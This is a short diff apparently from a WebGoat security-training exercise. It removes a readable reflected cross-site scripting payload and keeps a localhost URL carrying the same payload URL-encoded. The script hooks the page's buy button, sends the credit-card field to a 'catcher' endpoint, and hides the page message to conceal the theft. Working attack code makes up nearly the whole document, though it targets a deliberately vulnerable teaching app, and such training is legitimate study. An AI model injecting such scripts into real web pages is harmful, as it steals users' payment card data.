@@ -1,13 +1,1 @@
-<!-- payload -->
-<script>
-    var btn = document.getElementsByName("buy")[0];
-    btn.addEventListener('click', function () { steal(); }, false);
-    function steal() {
-        $.ajax({ type: "POST", url: "catcher?PROPERTY=yes&stolen-credit-card=" + document.getElementsByName("input1")[0].value, });
-    }
-    document.getElementsByName("input2")[0].value = "000";
-    document.getElementById("message").style.display = "none";
-</script>
-
-
 http://localhost:8090/WebGoat/start.mvc#attack/752417971/900?input1=000&input2=%3Cscript%3E%0A%20%20%20%20var%20btn%20%3D%20document.getElementsByName%28%22buy%22%29%5B0%5D%3B%0A%20%20%20%20btn.addEventListener%28%27click%27%2C%20function%20%28%29%20%7B%20steal%28%29%3B%20%7D%2C%20false%29%3B%0A%20%20%20%20function%20steal%28%29%20%7B%0A%20%20%20%20%20%20%20%20%24.ajax%28%7B%20type%3A%20%22POST%22%2C%20url%3A%20%22catcher%3FPROPERTY%3Dyes%26stolen-credit-card%3D%22%20%2B%20document.getElementsByName%28%22input1%22%29%5B0%5D.value%2C%20%7D%29%3B%0A%20%20%20%20%7D%0A%20%20%20%20document.getElementsByName%28%22input2%22%29%5B0%5D.value%20%3D%20%22000%22%3B%0A%20%20%20%20document.getElementById%28%22message%22%29.style.display%20%3D%20%22none%22%3B%0A%3C%2Fscript%3E
